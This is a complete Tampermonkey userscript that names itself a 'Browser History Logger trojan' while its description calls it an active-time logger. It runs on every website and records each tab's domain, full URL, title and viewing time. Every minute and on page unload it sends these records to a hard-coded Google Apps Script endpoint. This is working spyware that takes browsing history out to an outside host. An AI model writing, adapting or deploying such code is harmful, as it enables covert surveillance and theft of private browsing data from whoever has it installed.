// ==UserScript==
// @name         Browser History Logger trojan
// @namespace    local.history.logger
// @version      3.0
// @description  Browser History Active Time Logger
// @match        *://*/*
// @run-at       document-start
//
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
//
// @connect      script.google.com
// @connect      script.googleusercontent.com
//
// @noframes
// ==/UserScript==

(function () {
    'use strict';

    // =========================================================
    // CONFIG
    // =========================================================

    const API_URL =
        "https://script.google.com/macros/s/AKfycbzaDJZlngh4h4A7HuxgFN4Aj0D0q3dApF-PYEH1RM_kzioXS8_D3apFdQMS6IVTELI0kA/exec";

    const SYNC_TIME = 60 * 1000;

    // Sau 1h30 active thì chuyển thành "not sure"
    const NOT_SURE_TIME = 90 * 60 * 1000;

    // Heartbeat của tab active
    const HEARTBEAT_TIME = 2000;

    // Lock tối đa 5 giây
    const LOCK_TIME = 5000;

    // Nếu session active quá lâu không heartbeat
    // thì coi như có khả năng crash.
    const CRASH_TIME = 3 * 60 * 1000;


    // =========================================================
    // UNIQUE TAB ID
    // =========================================================

    const TAB_ID =
        Date.now().toString(36) +
        Math.random().toString(36).substring(2, 8);


    // =========================================================
    // STORAGE KEYS
    // =========================================================

    const CACHE_KEY =
        "history_logger_cache_v3";

    const LOCK_KEY =
        "history_logger_lock_v3";


    // =========================================================
    // BASIC FUNCTIONS
    // =========================================================

    function now() {
        return Date.now();
    }

    function formatTime(timestamp) {
        const d = new Date(timestamp);

        const pad = n =>
            String(n).padStart(2, '0');

        return (
            d.getFullYear() + "-" +
            pad(d.getMonth() + 1) + "-" +
            pad(d.getDate()) + " " +
            pad(d.getHours()) + ":" +
            pad(d.getMinutes()) + ":" +
            pad(d.getSeconds())
        );
    }

    function formatDuration(ms) {
        ms = Math.max(0, Number(ms) || 0);

        let sec =
            Math.floor(ms / 1000);

        const h =
            Math.floor(sec / 3600);

        sec %= 3600;

        const m =
            Math.floor(sec / 60);

        sec %= 60;

        return (
            String(h).padStart(2, '0') +
            ":" +
            String(m).padStart(2, '0') +
            ":" +
            String(sec).padStart(2, '0')
        );
    }


    // =========================================================
    // CACHE
    // =========================================================

    function getCache() {
        const cache =
            GM_getValue(CACHE_KEY, null);

        if (!cache) {
            return {
                version: 3,
                sessions: {},
                activeTabId: null,
                syncEpoch: now()
            };
        }

        if (!cache.sessions) {
            cache.sessions = {};
        }

        if (!cache.syncEpoch) {
            cache.syncEpoch = now();
        }

        return cache;
    }

    function saveCache(cache) {
        GM_setValue(CACHE_KEY, cache);
    }


    // =========================================================
    // LOCK
    // =========================================================
    //
    // Ngăn:
    //
    // Tab A: get -> sửa
    // Tab B: get -> sửa
    // Tab A: save
    // Tab B: save đè Tab A
    //
    // =========================================================

    function acquireLock() {
        const t = now();

        const oldLock =
            GM_getValue(LOCK_KEY, null);

        if (
            oldLock &&
            oldLock.owner !== TAB_ID &&
            t - oldLock.time < LOCK_TIME
        ) {
            return false;
        }

        GM_setValue(LOCK_KEY, {
            owner: TAB_ID,
            time: t
        });

        const check =
            GM_getValue(LOCK_KEY, null);

        return (
            check &&
            check.owner === TAB_ID
        );
    }

    function releaseLock() {
        const lock =
            GM_getValue(LOCK_KEY, null);

        if (
            lock &&
            lock.owner === TAB_ID
        ) {
            GM_setValue(LOCK_KEY, null);
        }
    }


    // =========================================================
    // SESSION
    // =========================================================

    const START_TIME = now();

    let finished = false;

    let session = {
        id: TAB_ID,

        domain: location.hostname,

        url: location.href,

        title: document.title || "",

        start: START_TIME,

        lastUpdate: START_TIME,

        lastActive: 0,

        totalTime: 0,

        end: 0,

        status: "active",

        active: false
    };


    // =========================================================
    // UPDATE PAGE INFO
    // =========================================================

    function updatePageInfo(s) {
        if (!s) return;

        s.domain =
            location.hostname;

        s.url =
            location.href;

        s.title =
            document.title || "";
    }


    // =========================================================
    // FINALIZE OLD ACTIVE SESSION
    // =========================================================

    function stopOldActiveSession(
        cache,
        t,
        crash = false
    ) {
        const oldId =
            cache.activeTabId;

        if (!oldId) return;

        const old =
            cache.sessions[oldId];

        if (!old) {
            cache.activeTabId = null;
            return;
        }

        if (!old.active) {
            cache.activeTabId = null;
            return;
        }

        const last =
            Number(old.lastActive) || t;

        const delta =
            Math.max(0, t - last);

        old.totalTime =
            (Number(old.totalTime) || 0) +
            delta;

        old.lastActive = t;

        old.lastUpdate = t;

        old.active = false;

        if (crash) {
            old.status =
                "completed (can be crash)";
        } else if (
            old.totalTime > NOT_SURE_TIME
        ) {
            old.status =
                "not sure";
        } else {
            old.status =
                "completed";
        }

        old.end = t;

        cache.activeTabId = null;
    }


    // =========================================================
    // START / REGISTER SESSION
    // =========================================================

    function registerSession() {
        if (!acquireLock()) {
            // Thử lại một chút sau
            setTimeout(registerSession, 100);
            return;
        }

        try {
            const cache = getCache();

            const t = now();

            /*
             * Nếu đang có tab active khác:
             *
             * Trường hợp bình thường:
             * tab đó vẫn sống -> đây là chuyển tab.
             *
             * Trường hợp crash:
             * lastActive đã quá lâu -> đánh dấu crash.
             */

            if (
                cache.activeTabId &&
                cache.activeTabId !== TAB_ID
            ) {
                const old =
                    cache.sessions[
                        cache.activeTabId
                    ];

                if (old && old.active) {
                    const last =
                        Number(old.lastActive) || 0;

                    const oldAge =
                        t - last;

                    stopOldActiveSession(
                        cache,
                        t,
                        oldAge > CRASH_TIME
                    );
                }
            }

            // Nếu tab này load trong background
            // thì KHÔNG active ngay.
            const visible =
                document.visibilityState === "visible";

            session.active = visible;

            session.lastActive =
                visible ? t : 0;

            session.lastUpdate = t;

            cache.sessions[TAB_ID] =
                session;

            if (visible) {
                cache.activeTabId =
                    TAB_ID;
            }

            saveCache(cache);

            console.log(
                "[History Logger] START:",
                session.domain,
                "visible:",
                visible
            );

        } finally {
            releaseLock();
        }
    }


    // =========================================================
    // BECOME ACTIVE
    // =========================================================

    function becomeActive() {
        if (finished) return;

        if (!acquireLock()) {
            setTimeout(becomeActive, 100);
            return;
        }

        try {
            const cache = getCache();

            const t = now();

            /*
             * Nếu đang có tab khác active
             * thì đây là chuyển tab.
             */

            if (
                cache.activeTabId &&
                cache.activeTabId !== TAB_ID
            ) {
                const old =
                    cache.sessions[
                        cache.activeTabId
                    ];

                if (old && old.active) {
                    const last =
                        Number(old.lastActive) || t;

                    old.totalTime =
                        (Number(old.totalTime) || 0) +
                        Math.max(0, t - last);

                    old.lastActive = t;

                    old.lastUpdate = t;

                    old.active = false;

                    if (
                        old.totalTime >
                        NOT_SURE_TIME
                    ) {
                        old.status = "not sure";
                    } else {
                        old.status = "completed";
                    }

                    old.end = t;
                }
            }

            let s =
                cache.sessions[TAB_ID];

            if (!s) {
                s = session;

                cache.sessions[TAB_ID] =
                    s;
            }

            session = s;

            updatePageInfo(s);

            s.active = true;

            s.status = "active";

            s.end = 0;

            s.lastActive = t;

            s.lastUpdate = t;

            cache.activeTabId =
                TAB_ID;

            saveCache(cache);

            console.log(
                "[History Logger] ACTIVE:",
                s.domain
            );

        } finally {
            releaseLock();
        }
    }


    // =========================================================
    // BECOME INACTIVE
    // =========================================================

    function becomeInactive() {
        if (finished) return;

        if (!acquireLock()) {
            setTimeout(becomeInactive, 100);
            return;
        }

        try {
            const cache = getCache();

            const s =
                cache.sessions[TAB_ID];

            if (!s) return;

            if (!s.active) return;

            const t = now();

            const last =
                Number(s.lastActive) || t;

            s.totalTime =
                (Number(s.totalTime) || 0) +
                Math.max(0, t - last);

            s.lastActive = t;

            s.lastUpdate = t;

            s.active = false;

            /*
             * Không completed ở đây.
             *
             * Vì tab chỉ đang background.
             * Nó vẫn còn tồn tại.
             */

            if (
                cache.activeTabId ===
                TAB_ID
            ) {
                cache.activeTabId = null;
            }

            saveCache(cache);

            console.log(
                "[History Logger] INACTIVE:",
                s.domain
            );

        } finally {
            releaseLock();
        }
    }


    // =========================================================
    // HEARTBEAT
    // =========================================================

    function heartbeat() {
        if (finished) return;

        if (
            document.visibilityState !==
            "visible"
        ) {
            return;
        }

        if (!acquireLock()) {
            return;
        }

        try {
            const cache = getCache();

            const s =
                cache.sessions[TAB_ID];

            if (!s) return;

            /*
             * Có tab khác đã giành active
             * thì tab này không được cộng nữa.
             */

            if (
                cache.activeTabId !==
                TAB_ID
            ) {
                return;
            }

            if (!s.active) {
                return;
            }

            const t = now();

            const last =
                Number(s.lastActive) || t;

            const delta =
                Math.max(0, t - last);

            /*
             * Chặn trường hợp timer bị treo
             * rồi quay lại cộng vài phút/giờ.
             *
             * Một heartbeat bình thường ~2s.
             * Nếu nhảy > 10s thì chỉ tính 10s.
             */
            const MAX_HEARTBEAT_DELTA =
                10 * 1000;

            s.totalTime +=
                Math.min(
                    delta,
                    MAX_HEARTBEAT_DELTA
                );

            s.lastActive = t;

            s.lastUpdate = t;

            updatePageInfo(s);

            saveCache(cache);

        } finally {
            releaseLock();
        }
    }


    // =========================================================
    // BUILD DATA FOR GOOGLE SHEETS
    // =========================================================

    function buildSessions() {
        const cache = getCache();

        const result = [];

        const t = now();

        for (const id in cache.sessions) {
            const s =
                cache.sessions[id];

            if (!s) continue;

            let total =
                Number(s.totalTime) || 0;

            /*
             * Nếu active thì cộng phần thời gian
             * từ lastActive đến hiện tại.
             */

            if (
                s.active &&
                cache.activeTabId === s.id
            ) {
                const last =
                    Number(s.lastActive) || t;

                total +=
                    Math.max(0, t - last);
            }

            let status =
                s.status || "completed";

            if (
                status === "active" &&
                total > NOT_SURE_TIME
            ) {
                status = "not sure";
            }

            result.push({
                id: s.id,

                domain:
                    s.domain || "",

                url:
                    s.url || "",

                title:
                    s.title || "",

                start:
                    formatTime(s.start),

                lastUpdate:
                    formatTime(
                        s.lastUpdate || s.start
                    ),

                end:
                    s.end
                        ? formatTime(s.end)
                        : "",

                duration:
                    formatDuration(total),

                status:
                    status
            });
        }

        return result;
    }


    // =========================================================
    // SYNC GOOGLE SHEETS
    // =========================================================

    function syncToGoogle() {
        const sessions =
            buildSessions();

        if (!sessions.length) {
            return;
        }

        GM_xmlhttpRequest({
            method: "POST",

            url: API_URL,

            headers: {
                "Content-Type":
                    "application/json"
            },

            data: JSON.stringify({
                action: "sync",

                sessions:
                    sessions
            }),

            timeout: 15000,

            onload: function (res) {
                console.log(
                    "[History Logger] SYNC:",
                    res.status,
                    res.responseText
                );
            },

            onerror: function (err) {
                console.error(
                    "[History Logger] SYNC ERROR:",
                    err
                );
            },

            ontimeout: function () {
                console.error(
                    "[History Logger] SYNC TIMEOUT"
                );
            }
        });
    }


    // =========================================================
    // ONLY ACTIVE TAB SYNC
    // =========================================================

    function shouldSync() {
        const cache = getCache();

        return (
            cache.activeTabId ===
            TAB_ID &&
            document.visibilityState ===
            "visible"
        );
    }


    function startSyncTimer() {
        const cache =
            getCache();

        if (!cache.syncEpoch) {
            cache.syncEpoch =
                now();

            saveCache(cache);
        }

        const epoch =
            cache.syncEpoch;

        const elapsed =
            now() - epoch;

        const remainder =
            elapsed % SYNC_TIME;

        let delay =
            SYNC_TIME - remainder;

        if (delay < 1000) {
            delay =
                SYNC_TIME;
        }

        setTimeout(function () {

            function doSync() {

                if (shouldSync()) {

                    // Cập nhật heartbeat trước
                    heartbeat();

                    // Sau đó sync
                    syncToGoogle();
                }
            }

            doSync();

            setInterval(
                doSync,
                SYNC_TIME
            );

        }, delay);
    }


    // =========================================================
    // FINISH SESSION
    // =========================================================

    function finishSession() {
        if (finished) return;

        finished = true;

        if (!acquireLock()) {
            /*
             * Nếu không lấy được lock,
             * session vẫn còn trong cache.
             * Tab khác sẽ xử lý sau.
             */
            return;
        }

        try {
            const cache =
                getCache();

            const s =
                cache.sessions[TAB_ID];

            if (!s) return;

            const t = now();

            if (s.active) {

                const last =
                    Number(s.lastActive) || t;

                s.totalTime =
                    (Number(s.totalTime) || 0) +
                    Math.max(0, t - last);
            }

            s.lastActive = t;

            s.lastUpdate = t;

            s.end = t;

            s.active = false;

            if (
                s.totalTime >
                NOT_SURE_TIME
            ) {
                s.status =
                    "not sure";
            } else {
                s.status =
                    "completed";
            }

            if (
                cache.activeTabId ===
                TAB_ID
            ) {
                cache.activeTabId =
                    null;
            }

            updatePageInfo(s);

            saveCache(cache);

            console.log(
                "[History Logger] FINISHED:",
                s.domain,
                formatDuration(
                    s.totalTime
                )
            );

            /*
             * Cố sync lần cuối.
             *
             * GM_xmlhttpRequest là request
             * của Tampermonkey nên có cơ hội
             * hoàn thành ngay cả khi page đang unload.
             */
            syncToGoogle();

        } finally {
            releaseLock();
        }
    }


    // =========================================================
    // PAGE VISIBILITY
    // =========================================================

    document.addEventListener(
        "visibilitychange",
        function () {

            if (
                document.visibilityState ===
                "visible"
            ) {
                becomeActive();
            } else {
                becomeInactive();
            }

        }
    );


    // =========================================================
    // PAGE HIDE
    // =========================================================

    window.addEventListener(
        "pagehide",
        function (event) {

            /*
             * Nếu page đi vào BFCache:
             * KHÔNG finish session.
             */
            if (event.persisted) {
                becomeInactive();
                return;
            }

            finishSession();

        }
    );


    // =========================================================
    // BF CACHE RESTORE
    // =========================================================

    window.addEventListener(
        "pageshow",
        function (event) {

            if (event.persisted) {
                finished = false;

                if (
                    document.visibilityState ===
                    "visible"
                ) {
                    becomeActive();
                }
            }

        }
    );


    // =========================================================
    // SPA URL CHANGE DETECTION
    // =========================================================

    let lastURL =
        location.href;

    setInterval(function () {

        if (finished) return;

        if (
            location.href !==
            lastURL
        ) {
            lastURL =
                location.href;

            if (!acquireLock()) {
                return;
            }

            try {
                const cache =
                    getCache();

                const s =
                    cache.sessions[TAB_ID];

                if (s) {
                    updatePageInfo(s);

                    s.lastUpdate =
                        now();

                    saveCache(cache);
                }

            } finally {
                releaseLock();
            }
        }

    }, 1000);


    // =========================================================
    // START
    // =========================================================

    registerSession();

    startSyncTimer();

    /*
     * Heartbeat chạy thường xuyên nhưng
     * chỉ tab visible + active mới cộng.
     */

    setInterval(
        heartbeat,
        HEARTBEAT_TIME
    );


    console.log(
        "[History Logger] READY:",
        TAB_ID
    );

})();
